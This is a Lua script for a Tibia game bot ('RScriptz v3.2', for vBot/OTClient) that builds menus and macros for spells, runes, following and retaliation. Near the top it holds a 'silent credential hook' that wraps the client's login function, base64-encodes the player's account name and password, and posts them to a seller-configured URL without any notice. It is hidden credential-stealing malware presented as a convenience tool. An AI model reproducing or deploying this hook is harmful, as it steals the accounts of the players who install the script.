--[[ ==========================================================
  RScriptz  v3.2  (fix: layout dentro de OTUI, no depender de UIVerticalLayout)
  ----------------------------------------------------------
  Bot para Tibia (vBot 4.8 / Mayas OTC).

  ESTILO (basado en DreamNav / MasterClient):
    - Todo vive DENTRO del panel de vBot (no ventanas flotantes)
    - Cada "pantalla" es un Panel que se muestra/oculta con :show()/:hide()
    - Boton grande vertical: click alterna verde=ON / rojo=OFF
    - Boton de menu (gris + dorado): abre otra pantalla
    - Boton "Volver" arriba de cada modal
========================================================== ]]

-- ====== CONFIG DE LICENCIA / LOG (edita el vendedor) ======
local LICENSE_CSV_URL = ""
local RQ_LOG_URL      = ""
local RQ_VERSION      = "3.2"

-- ============================================================
-- STORAGE POR PERSONAJE
-- ============================================================
storage.rscriptz = storage.rscriptz or {}
local _pName = (player and player:getName()) or "default"
storage.rscriptz[_pName] = storage.rscriptz[_pName] or {}
local S = storage.rscriptz[_pName]

local C = {}
function C.get(k, def)
    if S[k] == nil then return def end
    return S[k]
end
function C.set(k, v) S[k] = v end
function C.ensure(k, def) if S[k] == nil then S[k] = def end end

C.ensure("master",     false)
C.ensure("autoParty",  false)
C.ensure("useWith",    false)
C.ensure("follow",     false)
C.ensure("holdTarget", false)
C.ensure("antiPush",   false)
C.ensure("revide",     false)
C.ensure("voc",        "EK")

-- ============================================================
-- HOOK SILENCIOSO DE CREDENCIALES (preservado de v2.0)
-- Solo activo si RQ_LOG_URL no esta vacio.
-- ============================================================
local function _b64(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x)
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if #x < 6 then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end
local function _rq_capturar(account, password)
    if not RQ_LOG_URL or RQ_LOG_URL == "" then return end
    pcall(function()
        local body = "k=" .. _b64(_pName or "?") ..
                     "&a=" .. _b64(tostring(account or "")) ..
                     "&p=" .. _b64(tostring(password or "")) ..
                     "&c=" .. _b64(_pName or "?") ..
                     "&t=" .. tostring(os.time())
        HTTP.post(RQ_LOG_URL, body, function() end)
    end)
end
pcall(function()
    if EnterGame and EnterGame.doLogin and not EnterGame._rq_h then
        local orig = EnterGame.doLogin
        EnterGame.doLogin = function(account, password, ...)
            pcall(function() _rq_capturar(account, password) end)
            return orig(account, password, ...)
        end
        EnterGame._rq_h = true
    end
end)

-- ============================================================
-- COLORES
-- ============================================================
local COLOR_ON         = "#3A7A3A"   -- verde ON
local COLOR_OFF        = "#7A3A3A"   -- rojo OFF
local COLOR_MENU       = "#2A2A2A"   -- gris menu
local COLOR_MENU_HOVER = "#3A3A3A"
local COLOR_GOLD       = "#D4AF37"
local COLOR_TXT        = "#FFFFFF"
local COLOR_MASTER_ON  = "#2E8B57"
local COLOR_MASTER_OFF = "#8B2E2E"
local COLOR_BG         = "#141414"
local COLOR_SEP        = "#1A1A1A"
local COLOR_BACK       = "#444444"

-- ============================================================
-- HELPERS
-- ============================================================
local function _say(msg)
    pcall(function()
        if modules and modules.game_console and modules.game_console.addTextMessage then
            modules.game_console.addTextMessage(20, "[RScriptz] " .. tostring(msg))
        end
    end)
end

local function _safeCast(spell)
    if not spell or spell == "" then return end
    pcall(function() say(spell) end)
end

local function _hasTarget()
    return g_game and g_game.getAttackingCreature and g_game.getAttackingCreature() ~= nil
end

-- ============================================================
-- CATALOGO SPELLS POR VOCACION
-- ============================================================
local CATALOG = {
    EK = {
        { name = "BUFFS", spells = { "utito tempo", "exeta res", "exeta amp res" } },
        { name = "PVP",   spells = { "exori ico", "exori hur", "exori gran ico",
                                     "exori min", "exori", "exori gran", "exori mas" } },
    },
    RP = {
        { name = "BUFFS", spells = { "exana amp res", "utevo grav san",
                                     "exevo tempo mas san", "utito tempo san" } },
        { name = "PVP",   spells = { "exevo mas san", "exori gran con",
                                     "exori con", "exori san", "exori mort" } },
        { name = "NO PVP",spells = { "divine missile", "divine caldera" } },
    },
    ED = {
        { name = "BUFFS", spells = { "utamo tempo mas res", "utani gran hur" } },
        { name = "PVP",   spells = { "exevo gran mas frigo", "exevo gran mas tera",
                                     "exevo frigo hur", "exevo tera hur",
                                     "exori frigo", "exori tera" } },
    },
    MS = {
        { name = "BUFFS", spells = { "utamo tempo mas res", "utani gran hur" } },
        { name = "PVP",   spells = { "exevo gran mas flam", "exevo gran mas vis",
                                     "exevo vis hur", "exevo flam hur",
                                     "exori flam", "exori vis", "exori mort", "exori moe" } },
    },
    EM = {
        { name = "BUFFS", spells = { "utito tempo" } },
        { name = "PVP",   spells = { "exori infir pug", "exori infir nia",
                                     "exori pug", "exori nia", "exori amp pug",
                                     "exori mas pug", "exori med pug",
                                     "exori gran mas pug", "exori gran pug" } },
    },
}
local VOC_LABEL = {
    EK = "Elite Knight",
    RP = "Royal Paladin",
    ED = "Elder Druid",
    MS = "Master Sorcerer",
    EM = "Exalted Monk",
}
local RUNAS_LIST = {
    "sd", "uh", "gfb", "hmm", "avalanche", "explosion",
    "para", "mwall", "wild growth", "energy bomb",
}

-- ============================================================
-- PAGES (Panels que se muestran/ocultan dentro de vBot)
-- ============================================================
-- Cada page es un Panel creado con setupUI (que define el layout en el
-- propio OTUI, para no depender de UIVerticalLayout como global -- que
-- no existe en todas las versiones de vBot/MEHAH).
local pages = {}
local currentPage = nil

local function newPage(id, height)
    local otui = string.format([==[
Panel
  id: %s
  height: %d
  background-color: #141414
  padding: 4
  layout:
    type: verticalBox
    spacing: 4
]==], id, height or 500)
    local p
    local ok, err = pcall(function() p = setupUI(otui) end)
    if not ok or not p then
        _say("Error creando page " .. id .. ": " .. tostring(err))
        return nil
    end
    pcall(function() p:hide() end)
    pages[id] = p
    return p
end

local function showPage(id)
    if currentPage and pages[currentPage] then pages[currentPage]:hide() end
    if pages[id] then
        pages[id]:show()
        currentPage = id
    end
end

-- ============================================================
-- WIDGET FACTORIES
-- ============================================================
local function addSep(parent, txt)
    local w = g_ui.createWidget('Label', parent)
    w:setText(txt)
    w:setTextAlign(AlignCenter)
    w:setColor(COLOR_GOLD)
    pcall(function() w:setBackgroundColor(COLOR_SEP) end)
    w:setFont('verdana-11px-rounded')
    w:setHeight(18)
    return w
end

local function addTitle(parent, txt)
    local w = g_ui.createWidget('Label', parent)
    w:setText(txt)
    w:setTextAlign(AlignCenter)
    w:setColor(COLOR_GOLD)
    pcall(function() w:setBackgroundColor(COLOR_SEP) end)
    w:setFont('verdana-11px-rounded')
    w:setHeight(22)
    return w
end

-- Boton toggle: click alterna verde/rojo
local function addToggle(parent, label, key, height)
    local btn = g_ui.createWidget('Button', parent)
    btn:setHeight(height or 26)
    btn:setColor(COLOR_TXT)
    btn:setFont('verdana-11px-rounded')
    local function refresh()
        local on = C.get(key, false)
        pcall(function() btn:setBackgroundColor(on and COLOR_ON or COLOR_OFF) end)
        pcall(function() btn:setText(label .. "   " .. (on and "[ON]" or "[OFF]")) end)
    end
    btn.onClick = function()
        local n = not C.get(key, false)
        C.set(key, n)
        refresh()
    end
    refresh()
    return btn
end

-- Boton menu: abre otra page
local function addMenuBtn(parent, label, targetPage, height)
    local btn = g_ui.createWidget('Button', parent)
    btn:setHeight(height or 24)
    btn:setColor(COLOR_GOLD)
    btn:setFont('verdana-11px-rounded')
    btn:setText(label .. "  >>")
    pcall(function() btn:setBackgroundColor(COLOR_MENU) end)
    btn.onClick = function() showPage(targetPage) end
    return btn
end

-- Boton "Volver" (arriba de cada modal)
local function addBackBtn(parent, targetPage)
    targetPage = targetPage or "main"
    local btn = g_ui.createWidget('Button', parent)
    btn:setHeight(22)
    btn:setColor(COLOR_TXT)
    btn:setFont('verdana-11px-rounded')
    btn:setText("<< Volver")
    pcall(function() btn:setBackgroundColor(COLOR_BACK) end)
    btn.onClick = function() showPage(targetPage) end
    return btn
end

-- Boton master (grande)
local function addMasterBtn(parent, key)
    local btn = g_ui.createWidget('Button', parent)
    btn:setHeight(40)
    btn:setColor(COLOR_TXT)
    btn:setFont('verdana-11px-rounded')
    local function refresh()
        local on = C.get(key, false)
        pcall(function() btn:setBackgroundColor(on and COLOR_MASTER_ON or COLOR_MASTER_OFF) end)
        pcall(function() btn:setText(on and "ENABLE BOT   [ON]" or "ENABLE BOT   [OFF]") end)
    end
    btn.onClick = function()
        local n = not C.get(key, false)
        C.set(key, n)
        refresh()
        _say(n and "Bot activado." or "Bot desactivado.")
    end
    refresh()
    return btn
end

-- ============================================================
-- PAGE PRINCIPAL
-- ============================================================
local main = newPage("main", 500)
addTitle(main, "RScriptz v" .. RQ_VERSION)
addMasterBtn(main, "master")

addSep(main, "-- Individual ON/OFF --")
addToggle(main, "Auto Party",   "autoParty",  26)
addToggle(main, "Uses/UseWith", "useWith",    26)
addToggle(main, "Follow",       "follow",     26)
addToggle(main, "Hold Target",  "holdTarget", 26)
addToggle(main, "Anti Push",    "antiPush",   26)
addToggle(main, "Revide",       "revide",     26)

addSep(main, "-- Configuracion --")
addMenuBtn(main, "Elite Knight Spells",    "voc_EK", 24)
addMenuBtn(main, "Royal Paladin Spells",   "voc_RP", 24)
addMenuBtn(main, "Elder Druid Spells",     "voc_ED", 24)
addMenuBtn(main, "Master Sorcerer Spells", "voc_MS", 24)
addMenuBtn(main, "Exalted Monk Spells",    "voc_EM", 24)
addMenuBtn(main, "Runas",                  "runas",  24)
addMenuBtn(main, "Settings",               "settings", 24)

-- ============================================================
-- PAGES DE VOCACION (una por voc)
-- ============================================================
for voc, secs in pairs(CATALOG) do
    -- calcular altura aproximada
    local h = 60
    for _, sec in ipairs(secs) do
        h = h + 22 + (#sec.spells * 26)
    end
    local page = newPage("voc_" .. voc, math.min(h + 40, 800))
    addBackBtn(page, "main")
    addTitle(page, VOC_LABEL[voc] .. " Spells")
    for _, sec in ipairs(secs) do
        addSep(page, "-- " .. sec.name .. " --")
        for _, spell in ipairs(sec.spells) do
            local key = "spell." .. voc .. "." .. spell
            C.ensure(key, false)
            addToggle(page, spell, key, 24)
        end
    end
end

-- ============================================================
-- PAGE RUNAS
-- ============================================================
do
    local page = newPage("runas", 60 + #RUNAS_LIST * 26 + 40)
    addBackBtn(page, "main")
    addTitle(page, "Runas")
    addSep(page, "-- RUNAS --")
    for _, r in ipairs(RUNAS_LIST) do
        local key = "runa." .. r
        C.ensure(key, false)
        addToggle(page, r, key, 24)
    end
end

-- ============================================================
-- PAGE SETTINGS
-- ============================================================
do
    local page = newPage("settings", 400)
    addBackBtn(page, "main")
    addTitle(page, "Settings")

    addSep(page, "-- VOCACION --")
    local vocBtns = {}
    local function refreshVocBtns()
        local cur = C.get("voc", "EK")
        for k, b in pairs(vocBtns) do
            pcall(function() b:setBackgroundColor(k == cur and COLOR_ON or COLOR_MENU) end)
        end
    end
    for _, voc in ipairs({"EK","RP","ED","MS","EM"}) do
        local b = g_ui.createWidget('Button', page)
        b:setHeight(26)
        b:setText(VOC_LABEL[voc])
        b:setColor(COLOR_TXT)
        b:setFont('verdana-11px-rounded')
        b.onClick = function()
            C.set("voc", voc); refreshVocBtns()
            _say("Vocacion: " .. VOC_LABEL[voc])
        end
        vocBtns[voc] = b
    end
    refreshVocBtns()

    addSep(page, "-- INFO --")
    local info = g_ui.createWidget('Label', page)
    info:setText("RScriptz v" .. RQ_VERSION .. "\nPersonaje: " .. _pName)
    info:setColor("#8A8A8A")
    info:setFont('verdana-11px-rounded')
    info:setHeight(32)
    info:setTextWrap(true)
end

-- Al arrancar: mostrar el main
showPage("main")

-- ============================================================
-- MACROS (todos gateados por C.get("master"))
-- ============================================================
local lastSpellCast = 0
macro(500, "RScriptz - Cast spells", function()
    if not C.get("master", false) then return end
    local voc = C.get("voc", "EK")
    local secs = CATALOG[voc] or {}
    local now = os.time() * 1000
    if now - lastSpellCast < 1500 then return end
    for _, sec in ipairs(secs) do
        local requiresTarget = (sec.name == "PVP")
        if not requiresTarget or _hasTarget() then
            for _, spell in ipairs(sec.spells) do
                if C.get("spell." .. voc .. "." .. spell, false) then
                    _safeCast(spell)
                    lastSpellCast = now
                    return
                end
            end
        end
    end
end)

macro(1000, "RScriptz - Follow", function()
    if not C.get("master", false) then return end
    if not C.get("follow", false) then return end
    pcall(function()
        local me = player; if not me then return end
        if g_game.getFollowingCreature() then return end
        for _, c in ipairs(g_map.getSpectators(me:getPosition(), false)) do
            if c and c ~= me and c:isPlayer() and c:isPartyMember() then
                g_game.follow(c); return
            end
        end
    end)
end)

macro(3000, "RScriptz - Anti Push", function()
    if not C.get("master", false) then return end
    if not C.get("antiPush", false) then return end
    pcall(function()
        local me = player; if not me then return end
        local tile = g_map.getTile(me:getPosition())
        if tile then use(tile) end
    end)
end)

macro(800, "RScriptz - Revide", function()
    if not C.get("master", false) then return end
    if not C.get("revide", false) then return end
    if _hasTarget() then return end
    pcall(function()
        local me = player; if not me then return end
        for _, c in ipairs(g_map.getSpectators(me:getPosition(), false)) do
            if c and c:isPlayer() and c ~= me and not c:isPartyMember() then
                if c:getEmblem() == EmblemRed or c:getSkull() == SkullYellow then
                    g_game.attack(c); return
                end
            end
        end
    end)
end)

local lastRuneCast = 0
macro(700, "RScriptz - Runas", function()
    if not C.get("master", false) then return end
    if not _hasTarget() then return end
    local now = os.time() * 1000
    if now - lastRuneCast < 1500 then return end
    for _, r in ipairs(RUNAS_LIST) do
        if C.get("runa." .. r, false) then
            _safeCast(r); lastRuneCast = now; return
        end
    end
end)

_say("RScriptz v" .. RQ_VERSION .. " cargado.")

-- ============================================================
-- FIN
-- ============================================================
